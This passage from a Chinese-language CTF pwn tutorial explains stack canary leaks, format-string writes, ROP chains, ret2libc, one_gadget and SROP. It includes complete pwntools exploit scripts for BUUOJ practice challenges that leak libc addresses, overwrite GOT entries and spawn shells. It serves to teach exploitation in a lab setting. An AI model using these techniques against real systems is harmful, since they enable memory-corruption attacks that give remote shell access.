| `0x38` | old rbp |  |
| `0x40` | saved RIP | 返回地址 |

（所以对于开启了 canary 保护的程序，类似 `_BYTE buf[24]; // [rsp+0h] [rbp-20h] BYREF` 的伪代码，**到 rbp 距离有 0x20 中，是包含 canary 的**，`payload = b'A'*0x18 + p64(canary)`）

而函数返回时会做以下检查：

* 取出栈上的 canary
* 和“原始 canary”比较 （存储在 *线程本地存储 TLS（Thread-Local Storage）* 上）
* 不相等就 `__stack_chk_fail()` 直接崩溃

那么思路就很明显了：写到 RET 前必然先写到 Canary，除非你能把 Canary 写成原样，也就是 **泄露 Canary**。

但是为了防止 Canary 被 `puts` 或 `printf("%s")` 等字符串打印函数意外泄露，Canary 的最低位字节永远是 \x00（例如：`0x7bf3a94832451200`）。因为 \x00 是字符串的结束符，打印函数读到这里就会停下。

而泄露 Canary 的常见方式有两种。

### 覆盖 canary 低字节泄露

常见叫法有很多种：

* Canary byte overwrite leak（覆盖 canary 低字节泄露）
* Null-byte overwrite leak / off-by-one leak（空字节覆盖/Off-by-one 泄露）
* String over-read leak（字符串越界读取泄露）
* puts 泄露 canary、通过 %s 泄露 canary

总而言之是一个东西。

Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串，即程序遇到 `printf("%s", buf)`、`puts(buf)` 这种按字符串输出的函数时，输出会在遇到 `\x00` 就停下，不容易“顺带把后面的栈内容打印出来”。

**泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。**

这种利用方式需要存在合适的输出函数，并且可能需要 **第一溢出** 泄露 Canary，之后 **再次溢出** 控制执行流程。

假设栈上布局为：`buf | canary(8字节) | saved rbp | ret`。

canary 形似：`00 aa bb cc dd ee ff 11`。

如果有 `puts(buf)`，正常情况下输出读到 canary 的第一个字节就是 00，就停了，

但如果把 00 改掉，比如改成 'A'（41），那么 canary 形似：`41 aa bb cc dd ee ff 11`，输出函数就会继续把 canary 后面的字节 `aa bb cc ...` 也当成“字符串内容”输出出来。

（直到某个地方再次遇到 \x00 才停止）

同时 canary 坏了，所以这次程序崩溃，再拿正确的 Canary 溢出第二次，这就是二次溢出。

#### 例题 1：jarvisoj_fm

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_fm)

※ hint：32 位的地址刚好输出长度为 4。

<img width="602" height="75" alt="image" src="https://github.com/user-attachments/assets/e93c3d60-45e1-47e8-9f89-b07c9231fc89" />

IDA 查到 x 地址为 `x	0804A02C`，调试一下得 offset = 11.

```
# written by Sonnety
from pwn import *
context.arch = "i386"

host = "node5.buuoj.cn"
port = 28944
x_addr = 0x804A02C

def main():
    io = remote(host,port)
    payload = p32(x_addr) + b"%11$n"    # offset = 11
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：[第五空间2019 决赛]PWN5

[BUU CTF 题目链接](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)

※ hint：更改随机生成的密码。

<img width="406" height="68" alt="f80dc88844da732b02f4c731b4158d1e" src="https://github.com/user-attachments/assets/31e08b04-277a-4c74-b295-bab2086f1d38" />

`buf_` 地址 `0x804C044`，offset = 10。

```
# written by Sonnety
from pwn import *
context.arch = "i386"

host = "node5.buuoj.cn"
port = 29968
buf_addr = 0x804C044

def main():
    io = remote(host,port)
    io.recvuntil("your name:")
    payload = p32(buf_addr)+b"%10$n"    # offset = 10
    io.sendline(payload)
    io.recvline()
    io.recvuntil("your passwd:")
    io.sendline(b"4")
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：axb_2019_fmt32

[BUU CTF 题目链接](https://buuoj.cn/challenges#axb_2019_fmt32)

※ hint：GOT 表覆写攻击。

<img width="2042" height="760" alt="image" src="https://github.com/user-attachments/assets/110a929a-82e8-4b7c-b563-1100dab1acae" />

复读机，有 `printf(format);`，显然 fmt。

`sprintf(format, "Repeater:%s\n", s);` 会把 s 填到 %s 上，然后赋值给 format。

比如输入一个 hello，那么 format 就会等于 Repeater:hello\n。

所以通过 sprintf，我们可以实现向 format 的任意读写（但是不能栈溢出，因为没有 ret，s 还限制了读入长度）

因为没有 ret，是死循环程序，所以栈溢出被堵死，只能考虑 got 表覆写，通过第一次泄露 libc，第二次向 printf_got 或者 read_got 覆写 system 或者 one_gadget。

<img width="1100" height="794" alt="05aad958e58fbdd0eb09940b66afca63" src="https://github.com/user-attachments/assets/1edbf502-dd21-44ed-a558-c788e1876d4f" />

偏移量是 8.

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27434
io = remote(host,port)
# io = process("./axb_2019_fmt32")
elf = ELF("./axb_2019_fmt32")
libc = ELF("./libc-2.23.so")
printf_got = elf.got['printf']

def main():
    io.recvuntil(b"So I'll answer whatever you say!\n")
    print("\n[+] Leak printf GOT address :",hex(printf_got))
    io.recvuntil(b"Please tell me:")
    payload = b'A' + p32(printf_got) + b"%8$s"
    io.sendline(payload)
    io.recvuntil(b"Repeater:A" + p32(printf_got))
    leak_data = io.recv(4)
    printf_addr = u32(leak_data)
    print("\n[+] Leak printf address :",hex(printf_addr))
    libc_base = printf_addr - libc.sym['printf']
    print("\n[+] Leak libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n[+] Leak system address :",hex(system))
    one_gadget_offset = 0x3a812
    one_gadget = libc_base + one_gadget_offset
    print("\n[+] Leak One gagdet address",one_gadget)
    io.recvuntil(b"Please tell me:") 
    payload = b'A' + fmtstr_payload(8,{printf_got:one_gadget},write_size="byte",numbwritten=0xa)
    # payload = b'A' + fmtstr_payload(8,{printf_got:system},write_size="byte",numbwritten=0xa)
    io.sendline(payload)
    sleep(0.01)
    # io.sendline(b";/bin/sh")
    # sleep(0.01)
    io.sendline(b"cat flag")
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 题单

由于 canary 绑 ROP，还有 canary 绑 ret2libc 的题我都不打算放这里，所以这里就剩一道题了，haha。

BUU CTF:

[web_of_sci_volga_2016](https://buuoj.cn/challenges#web_of_sci_volga_2016)

---

## ROP 链基础

在开启了 NX 保护，栈上的数据变得“不可执行”时，ROP 链是解题的主要思路。

ROP（Return Oriented Programming）的本质是：

通过溢出控制**返回地址 EIP/RIP**，把下一步要返回到哪里、参数是什么都提前摆在栈上，从而把多个调用串起来。

既然我们不能自己写代码执行，那就利用程序段（.text）或库函数（libc）中原本就存在的代码片段。

这些片段通常以 `ret` 指令结尾，被称为 Gadgets。

* Gadgets: 比如 `pop rdi; ret`。这条指令的作用是将栈顶数据弹出到 `rdi` 寄存器，然后返回。
* Chain: 通过精心构造栈布局，让 `ret` 指令不断连接不同的 Gadgets，像链条一样执行一连串操作。

比如 64 位的一条朴素 ROP 链 `payload = b'A'*0x30 + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(114514) + p64(write_plt) + p64(main_addr)`，其栈上情况大抵如此：

| 地址 | 数据 | 备注 |
| --- | --- | --- |
| `0x00` | `b'A' * offset` | padding |
| `0x30` | pop_rdi_ret | 返回地址 |
| `0x38` | 1 | rdi |
| `0x40` | pop_rsi_r15_ret |  |
| `0x48` | write_got | rsi |
| `0x50` | 114514 | r15 |
| `0x58` | write_plt | |
| `0x60` | main_addr | write 执行后的返回地址 |

当 read 函数执行到 ret 的时候，就会从 pop_rdi_ret 一路执行下来，控制大量寄存器，并且最后执行 write 输出 write 的真实地址。

这也是常规 ret2libc 的第一次 ROP。

至于 32 位，ROP 链没有寄存器，更加朴素：`payload = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)`

### ROPgadget 工具

我们常用以下 ROPgadget 指令得到有效的 gadgets：

`ROPgadget --binary rop --only "pop|ret" | grep rdi` 获取单个寄存器（这里是 rdi）的 gadgets

`ROPgadget --binary rop --only "pop|ret" --filter "00"` 排除所有地址中包含 00 的 gadgets（如果是 gets() 或者 scanf("%s")，地址带 00 会导致截断）

`ROPgadget --binary rop --string "syscall"` 查找系统调用（用于 SROP）

`ROPgadget --binary rop --only "leave|ret"` 查找栈迁移的 gadgets

`ROPgadget --binary rop | grep "mov.*ptr.*ret"` 寻找类似 `mov [rdi], rsi` 这种格式。

`ROPgadget --binary rop | grep "jmp rsp"` 寻找是否有跳转到 rsp 的指令。

| 参数 | 作用 | 备注 |
| --- | --- | --- |
| `--binary <file>` | 指定目标文件 | 必选 |
| `--only "<ins>"` | 只显示包含特定指令的行 | 常用 `"pop|ret"` |
| `--grep "<string>"` | 在结果中搜索字符串 | 也可以直接配合系统 `grep` |
| `--filter "<hex>"` | 过滤掉包含特定字节的地址 | 用于避开坏字符（如 `00`） |
| `--offset <addr>` | 设置基址偏移 | 常用在绕过 ASLR 后计算真实地址 |
| `--range <start>-<end>` | 在指定内存范围搜索 | 缩小搜索范围 |
| `--string "/bin/sh"` | 查找硬编码字符串 | 看看程序里有没有现成的 "/bin/sh" |

ROPgadget 还有全自动生成一条完整 ROP 链的指令，即 `ROPgadget --binary rop --ropchain`，其内部逻辑是遍历 rop 这个二进制文件，尝试寻找以下组件并拼凑起来：

* 向内存（如 .data 或 .bss 段）写入 `/bin/sh` 字符串的 gadgets。
* 控制目标寄存器的 gadgets（例如 x86 下的 `eax=11, ebx, ecx, edx`，或者 x64 下的 `rax=59, rdi, rsi, rdx`）。
* 触发系统调用的 gadget (`int 0x80` 或 `syscall`)。

这使得它具有以下限制性：

* **往往只适用于静态编译**：程序绝大多数都是动态链接的，在动态链接的程序中，二进制文件本体非常小，包含的指令极其有限，凑不出来这么多 gadgets。
* **无法应对 ASLR，有限栈空间，坏字符等问题**。

所以它的应用空间很狭小，但是我们的例题 1 就可以这么用。

#### 例题 1：inndy_rop

[BUU CTF 题目链接](https://buuoj.cn/challenges#inndy_rop)

※ hint：静态链接。

发现这个二进制文件大的离谱，赶紧检查一下。

<img width="1633" height="174" alt="2a200b74e27ff693c5f925bf8f2e2e95" src="https://github.com/user-attachments/assets/e994f3bc-f4b5-4db7-8f6d-aad8b7e9edce" />

果然是静态链接，那么我们就可以用 `ROPgadget --binary rop --ropchain` 直接得到一套 ROP 链。

```
# written by Sonnety
from pwn import *
from struct import pack
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28089
io=remote(host,port)

def main():
    p = b'A'*0x10
    p += pack('<I', 0x0806ecda) # pop edx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080b8016) # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda) # pop edx ; ret
    p += pack('<I', 0x080ea064) # @ .data + 4
    p += pack('<I', 0x080b8016) # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080492d3) # xor eax, eax ; ret
    p += pack('<I', 0x0805466b) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080de769) # pop ecx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x0806ecda) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080492d3) # xor eax, eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0807a66f) # inc eax ; ret
    p += pack('<I', 0x0806c943) # int 0x80
    io.send(p)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 2：[HarekazeCTF2019]baby_rop

[BUU CTF 题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)

※ hint：最简单的 ROP 链。

有 binsh，有 system。


```
# written by Sonnety
from pwn import*
context.arch = "amd64"

host = "node5.buuoj.cn"
port = 29812

io=remote(host,port)
offset = 24
system = 0x400490
binsh = 0x601048
pop_rdi_ret = 0x400683
payload = b"A"*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)

def main():
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：others_babystack

[BUU CTF 题目链接](https://buuoj.cn/challenges#others_babystack)

※ hint：Canary + ROP，注意 ROP 要 ret 引爆。

首先泄露 canary，canary 前两位是 \x00 截断了输出，我们用 A 覆盖它。

<img width="2106" height="1306" alt="e18249248ac6e91dd1429cfafe26720f" src="https://github.com/user-attachments/assets/7d45e59d-1646-4535-ae4b-3f1675dde5d7" />

把 canary 填上之后就是轻松的 ROP 链了。

注意 ROP 链需要 ret 来引爆，刚好 opt=3 是 return 0.

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 28356
io = remote(host,port)
# io = process("./babystack")
elf = ELF("./babystack")
libc = ELF("./libc-2.23.so")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x400908
pop_rdi_ret = 0x400a93
ret = 0x400a94

def main():
    io.recvuntil(b">> ")
    # print("\n[+] Leak puts GOT address :",hex(puts_got))
    io.sendline(b"1")
    sleep(0.1)
    payload = b'A'*0x84 + b"meow" + b'A'
    io.send(payload)
    io.recvuntil(b">> ")
    io.sendline(b"2")
    io.recvuntil(b"meowA")
    leak_data = io.recvn(7)
    leak_data = leak_data.rjust(8,b"\x00")
    canary = u64(leak_data)
    print("\n[+] Leak canary :",hex(canary))
    io.recvuntil(b">> ")
    io.sendline(b"1")
    sleep(0.1)
    payload_1 = b'B'*0X88 + p64(canary) + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    # gdb.attach(io,"b *0x4009DD\nc")
    # pause()
    io.send(payload_1)
    io.recvuntil(b">> ")
    io.sendline(b"3")
    leak_data = io.recvline().strip(b'\n').ljust(8,b'\x00')
    # print("\n[*] DEBUG: leak data = ",leak_data)
    puts_addr = u64(leak_data)
    print("\n[+] Leak puts address :",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    print("\n[+] Leak libc base address :",hex(libc_base))
    system = libc_base + libc.sym['system']
    print("\n[+] Leak system address :",hex(system))
    binsh = libc_base + next(libc.search("/bin/sh"))
    print("\n[+] Leak /bin/sh address :",hex(binsh))
    io.sendline(b"1")
    sleep(0.1)
    payload_2 = b'C'*0x88 + p64(canary) + b"C"*8 + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
    io.send(payload_2)
    io.recvuntil(b">> ")
    io.sendline(b"3")
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 题单

没有区分特点的题单，零基础可以做做。

纯 ROP 的题目不多了，感觉 ret2libc 的题目比较多，也有可能是我题目做少了。

BUU CTF：

[ciscn_2019_ne_5](https://buuoj.cn/challenges#ciscn_2019_ne_5)（※ hint：不一定要 /bin/sh，可以 ROPgadget 找一下 --string "sh"）

---

## Ret2libc

我不会用 LibcSearcher，所以使用 [libc 搜索网站](https://libc.blukat.me/) 或者直接在 [BUUOJ libc下载](https://buuoj.cn/resources) 找找。

> 前文提到 ASLR，PLT，GOT 可复习。

在 ROP 链的基础上，我们不跳去执行栈上的代码，而是在跳转执行 C 标准库（libc.so）中的函数，最后 `system("\bin\sh")`。

在 ASLR 的基础下，libc 在内存中的基地址每次运行都是随机化的，但是 **函数在 libc 库中的偏移是固定的**。

如果我们能够泄露出某个执行过的函数的真实地址（在 GOT 表上），我们就可以反推 libc_base。

紧接着就可以配合固定的偏移量得到 `system` 的真实地址。

朴素 ret2libc 的第一个 ROP 链已在 ROP 链基础中详细讲过，不再赘述。

#### 例题 1：ciscn_2019_c_1

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_en_2)

※ hint：strlen() 是以 `\0` 为截停符。

主函数告诉你只有操作 1 有意义。

加密函数告诉你他会对你异或加密，但是 `strlen()` 遇到 `\0` 就截停，可以通过此方法跳过加密。

跳过加密之后就可以泄露 puts 了，ret2libc。

```

# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28676
io = remote(host,port)
# io = process("./ciscn_2019_en_2")
elf = ELF('./ciscn_2019_en_2')
offset = 0x57
pop_rdi_ret = 0x400c83
ret = 0x400c84
pop_rsi_r15_ret = 0x400c81
encrypt_addr = 0x4009a0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload_1 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt_addr)

def main():
    io.recvuntil(b"Input your choice!\n")
    io.sendline(b"1")
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_1)
    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
    print(hex(puts_addr))   # 0x7f2a1ef599c0
    system_addr = puts_addr - 0x31580
    binsh_addr = puts_addr + 0x1334da
    payload_2 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(ret) + p64(system_addr)
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()

```

#### 例题 2：bjdctf_2020_babyrop2

[BUU CTF 题目链接](https://buuoj.cn/challenges#bjdctf_2020_babyrop2)

※ hint：canary + ret2libc

开了 canary 保护，但是 fmt 漏洞。

简单扫一下，发现偏移是 6，然后第 7 个有点像 canary，gdb 一下发现就是。

<img width="1899" height="1049" alt="f0c1d1c8bbbae9e679e199c2afd1d17b" src="https://github.com/user-attachments/assets/c7b3232a-8f05-47f1-9688-97cc81964716" />

然后直接 ret2libc。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')
context.terminal = ['tmux', 'splitw', '-h']

host = "node5.buuoj.cn"
port = 27342
io = remote(host,port)
# io = process("./bjdctf_2020_babyrop2")
elf = ELF("./bjdctf_2020_babyrop2")
libc = ELF("./libc-2.23.so")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']
pop_rdi_ret = 0x400993
ret = 0x400994

def main():
    io.recvuntil(b"I'll give u some gift to help u!\n")
    payload_1 = b"AA%7$p"   # 7 11
    io.send(payload_1)
    io.recvuntil(b"AA")
    leak_data = io.recvline().strip(b'\n')
    leak_canary = int(leak_data,16)
    print("\n[+] Leak Canary:",hex(leak_canary))
    io.recvuntil(b"Pull up your sword and tell me u story!\n")
    payload_2 = b'A'*0x18 + p64(leak_canary) + b"B"*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
    # payload_2 = b'A'*8 + b'B'*8 + b'C'*8
    # gdb.attach(io,"b *0x4008D8\n c")
    # pause()
    io.send(payload_2)
    leak_data = io.recvline().strip(b'\n')
    leak_data = leak_data.ljust(8,b'\x00')
    puts_addr = u64(leak_data)
    print("\n[+] Leak puts:",hex(puts_addr))
    libc_base = puts_addr - libc.sym['puts']
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    print("\n[+] Leak libc base:",hex(libc_base))
    print("\n[+] Leak system:",hex(system))
    print("\n[+] Leak binsh:",hex(binsh))
    io.recvuntil(b"I'll give u some gift to help u!\n")
    io.send(payload_1)
    io.recvuntil(b"Pull up your sword and tell me u story!\n")
    payload_3 = b'A'*0x18 + p64(leak_canary) + b"B"*8 + p64(ret) +  p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
    io.sendline(payload_3)
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：[OGeek2019]babyrop

[BUU CTF 题目链接](https://buuoj.cn/challenges#[OGeek2019]babyrop)

※ hint：输入的第 8 个数会被当成什么？

依旧 32 位，大概意思是会拿输入的数和一个随机数进行比对，如果错了直接退出程序，但是依旧 `strlen()` 比对，所以前加 `\x00` 跳过它。

然后拿输入的第 8 个数，`bufa[7]` 当作函数的返回值，传到第二个函数里当 `read()` 的长度限制，所以我们输入 `\xFF` 超长长度。

然后就开始 ret2libc 爽吃。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28281
io = remote(host,port)
# io = process('./pwn')
elf = ELF('./pwn')

offset = 235
write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = 0x8048825
payload_1 = b'\x00' + b'A'*6 + b'\xFF'  # '\x00' 截断字符比对，'\xFF' 使函数返回值为 255

def main():
    io.sendline(payload_1)
    io.recvuntil(b"Correct\n")
    payload_2 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    io.sendline(payload_2)
    leak_data = io.recvn(4)
    write_addr = u32(leak_data)
    print(hex(write_addr))  # 0xf7e233c0 → libc6_2.23-0ubuntu11.3_i386
    libc = write_addr - 0xd43c0
    system = libc + 0x3a940
    binsh = libc + 0x15902b
    payload_3 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
    io.sendline(payload_1)
    io.recvuntil(b"Correct\n")
    io.sendline(payload_3)
    io.interactive()


if __name__ == "__main__":
    main()
```

#### 题单

没有区分特点的题单，零基础可以做做。

[[HarekazeCTF2019]baby_rop2](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2)

[jarvisoj_level4](https://buuoj.cn/challenges#jarvisoj_level4)

[pwn2_sctf_2016](https://buuoj.cn/challenges#pwn2_sctf_2016)

[bjdctf_2020_babyrop](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

[铁人三项(第五赛区)_2018_rop](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)

## one_gadget

其实算一个必须知道的小技巧，不是很大的知识点（大概）

one_gadget 是 glibc 库里一个非常特殊的代码片段，仅调用单个地址就可以直接获得 shell，其实伪代码可以简单理解为：

```
void magic_gadgets(){
	if (constraints_satisfied){//约束条件检查
		execve("/bin/sh",0,0);
		exit(0);
	}
}
```

使用 one_gadget 工具，可以对 libc 文件扫描算出所有的这些现成的、直接能拿 Shell 的代码片段，**距离 libc 基址的相对偏移量**。（也就是说我们首先要 ret2libc）

在以下三种情况中可以尝试使用 one_gadget:

* 溢出空间极其狭小：如果题目只能覆盖 old rbp 和 返回地址，那么纯 ROP 链就不太合适了，可以尝试使用 one_gadget。

* 缺少关键的 Gadget 寄存器：如果 ROPgadget 工具找不到 `pop rdi;ret` 这种至关重要的寄存器，或者缺少 system 函数时。

* 栈环境被严格限制： 遇到沙箱（Sandbox）或者某些严苛的代码审查，传统 ROP 链会被拦截，而 One Gadget 直接在 libc 内部跳转，隐蔽性极强。

### 使用技巧

one_gadget 通常有 Constraints（约束条件）。

例如：

* `rax == NULL` （跳转过去的瞬间，rax 寄存器必须是 0）

* `[rsp+0x30] == NULL` （跳转过去的瞬间，栈顶往下 0x30 的位置必须是 0）

* `r12 == NULL` 等等...

一般使用时，要么刻意构造（如 在特定位置 [rsp+0x30] 处写入 0），要么前置 gadget 铺垫（如 `xor rax rax;ret` 使 rax 等于 0），要么 **玄学抽卡**（一个个暴力试哈哈）

#### 例题 1：ciscn_2019_c_1

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_c_1)

<img width="880" height="485" alt="image" src="https://github.com/user-attachments/assets/b1d9274b-982b-4c3b-bfae-9e7a06d3fd88" />

这个题在 ret2libc 里正常做法，下面是 one_gadget 做法，更加简洁：

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26565
io = remote(host,port)
elf = ELF("./ciscn_2019_c_1")
libc = ELF("./libc-2.27.so")
offset = 0x57
padding = b'\0' + b"A"*offset
pop_rdi_ret = 0x400c83
ret = 0x400c84
encrypt = 0x4009A0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload_1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt)

def main():
    io.recvuntil(b"Input your choice!\n")
    io.sendline(b"1")
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_1)
    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))    
    print(hex(puts_addr))   # 0x7f32720c99c0 → libc6_2.27-3ubuntu1_amd64
    libc_base = puts_addr - libc.sym['puts']
    one_gadget_offset = 0x4f322
    one_gadget = libc_base + one_gadget_offset
    payload_2 = b'\0' + b'A'*offset + p64(one_gadget)
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_2)
    io.interactive()
    
if __name__ == "__main__":
    main()
```

---

## SROP

当我们做 ROP 题目时，偶尔发现找 `pop rdi; ret` 很容易，但是找 `pop rdx; ret` 往往不简单。

如果题目**可用的 gadget 少的可怜**，以及可能**根本没有在系统库的函数 got 表**。，我们传统的 ROP 就不可用了，需要考虑 SROP。

SROP (Sigreturn Oriented Programming) 是一种非常强大 ROP 的变种，它使一次性控制所有的 CPU 寄存器成为可能。

### Unix 的 signal 处理

在 unix 和 linux 中，当进程收到一个信号，内核会暂停当前程序的执行，转而去执行信号处理函数。

在这个“上下文切换”的过程中，内核为了保证处理完信号后能恢复原状，会把当前 CPU 里所有的寄存器状态（rax, rdi, rsi, rip, rsp 等等）一股脑地全部压入栈中。

这块保存在栈上的数据结构，被称为 Signal Frame（信号帧）。

当信号处理函数执行完毕后，程序会调用一个特殊的系统调用：`sys_sigreturn`，从栈上把那个 Signal Frame 里的数据原封不动地弹回各个寄存器中，恢复现场。

### 攻击步骤

**`sys_sigreturn` 会盲目地相信 SigFrame 数据，并把它们塞进寄存器。**

首先 `syscall` 会检查 rax 所存储的系统调用号，比如当 `rax = 1` 执行 `sys_write`，当 `rax = 15` 执行 `sys_sigreturn`，当 `rax = 59` 执行 `execve`。

（32 位和 64 位系统调用号不同，建议使用 `pwn constgrep -c` 查询）

所以我们需要**在返回地址上放 `mov rax,15;ret`，后面放 `syscall;ret`，执行了 sigreturn，并在下一个放 SigFrame，就可以 SROP 劫持所有的寄存器。**

值得一提的是，sigframe 的长度在 64 位系统中，pwntools 默认是 0xF8，并且 SigFrame 的前几个字节覆盖也不会对 SROP 的实际效果产生影响，它的前 8 个字符通常是 `uc_flags`，具体是什么不用管，总之执行 SROP 时不检查它。

在攻击中，我们最后的目的往往是使得，

```
	frame2 = SigreturnFrame()
    frame2.rax = constants.SYS_execve
    frame2.rdi = binsh_addr
    frame2.rsi = 0
    frame2.rdx = 0
#   frame2.rsp = 
#	frame2.rbp = 
    frame2.rip = syscall_ret
```

需要注意的是，我们的 frame.rip 必须指向 syscall 所在的某个地址，但是关于 `syscall` 与 `syscall;ret` 之间的选择，即如果只是执行 `sys_write` 之类的，后面还要继续 ROP 的，那就要选 `syscall;ret`，而直接 getshell 的则是两种皆可。

能够正确执行，其中难点在于找到 binsh_addr，为了使得 binsh 被写在栈的一个确定的位置，我们通常有几个方案：

* 方案 1 ：第一次 SROP 把栈强行迁移到固定地址的 bss 段（NO PIE）
* 方案 2 ：先泄露栈上的某个地址，然后动态调试得到 rsp 到泄露的栈的地址的偏移（通常本机和远端的偏移有一定差距）
* 方案 3 ：先泄露栈上的某个地址，然后栈迁移使 binsh 被写在一个确定的位置。

#### 例题 1：ciscn_2019_s_3

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_s_3)

※ hint：朴素的 SROP。

全是 sys_write 一类，没有 GOT 表，这也是我们不能用 ret2libc 的原因。

而 gadgets 函数已经暗示的很明显，就是 SROP。

如果我们用动态调试找一下 rsp 到泄露的栈的偏移，会发现 wsl 应该是 0x148，远端却是 0x110。

这往往是因为我们 wsl 或者虚拟机的环境变量更多导致的。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28445
io = remote(host,port)
# io = process("./ciscn_s_3")
elf = ELF("./ciscn_s_3")
vuln_addr = 0x4004ed
syscall = 0x400517
mov_rax_15_ret = 0x4004da

payload_1 = b'/bin/sh\x00' + b'A'*8 + p64(vuln_addr)
# 没有 pop rbp 直接 retn，所以 padding 长度为 0x10

def main():
    io.sendline(payload_1)
    # gdb.attach(io,"b *0x400517\nc")    # vuln 函数中执行 syscall 的指令地址
    # pause()
    io.recv(0x20)   # payload_1 + saved_rbp
    stack_leak = u64(io.recv(8))  # 泄露的栈上的地址
    binsh = stack_leak - 0x118    # 本地 0x148，靶机通常在 0x110 左右
    frame = SigreturnFrame()
    frame.rax = 59              # sys_execve
    frame.rdi = binsh           # 指向 /bin/sh
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall         # 恢复现场后，去执行 syscall
    payload_2 = b'/bin/sh\x00' + b'A'*8 + p64(mov_rax_15_ret) + p64(syscall) + bytes(frame)
    io.sendline(payload_2)
    io.interactive()


if __name__ == "__main__":
    main()
```

